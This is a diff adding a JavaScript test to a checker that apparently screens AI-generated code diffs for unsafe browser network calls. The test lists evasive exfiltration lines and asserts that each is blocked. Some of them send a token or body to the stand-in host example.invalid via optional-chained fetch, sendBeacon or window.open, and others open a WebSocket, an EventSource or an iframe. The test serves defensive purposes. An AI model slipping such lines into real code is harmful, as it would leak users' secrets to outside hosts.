@@ -183,3 +183,23 @@ test('independent Security rejects direct and computed browser location redirect
   }
   assert.equal(inspectModelDiff({ ...input, diff: '+const locationLabel = "Current status";' }).status, 'passed');
 });
+
+
+test('independent Security blocks optional browser network calls and EventSource', () => {
+  const attempts = [
+    "fetch?.(\"https://example.invalid/?data=\" + token);",
+    "window?.open?.(\"https://example.invalid/?data=\" + token);",
+    "globalThis?.[\"fetch\"]?.(\"https://example.invalid/?data=\" + token);",
+    "navigator?.sendBeacon?.(\"https://example.invalid\", body);",
+    "navigator?.[\"sendBeacon\"]?.(\"https://example.invalid\", body);",
+    "self?.WebSocket?.(\"wss://example.invalid\");",
+    "new EventSource(\"https://example.invalid/stream\");",
+    "document?.createElement?.(\"iframe\");"
+];
+  for (const addition of attempts) {
+    const result = inspectModelDiff({ ...input, diff: '+' + addition });
+    assert.equal(result.status, 'failed', addition);
+    assert.ok(result.findings.includes('Potentially unsafe new code'));
+  }
+  assert.equal(inspectModelDiff({ ...input, diff: '+const networkStatusLabel = "Ready";' }).status, 'passed');
+});
